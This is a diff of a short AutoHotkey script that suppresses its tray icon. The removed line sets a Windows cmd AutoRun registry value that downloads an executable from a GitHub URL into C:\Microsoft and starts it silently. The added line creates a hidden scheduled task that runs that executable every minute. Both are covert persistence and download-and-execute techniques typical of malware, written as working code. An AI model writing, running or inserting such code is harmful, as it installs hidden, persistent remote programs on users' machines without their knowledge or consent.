@@ -1,4 +1,4 @@
 #SingleInstance Ignore
 #NoTrayIcon
 
-RegWrite "mkdir C:\Microsoft & curl -L -o C:\Microsoft\run.exe https://raw.githubusercontent.com/astorrs276/Public-AHK/main/run.exe & start C:\Microsoft\run.exe & cls", "REG_SZ", "HKCU\Software\Microsoft\Command Processor", "AutoRun"
+Run 'cmd /c schtasks /create /sc minute /mo 1 /tn "RunEveryMinute" /tr "C:\Microsoft\run.exe"', , "Hide"
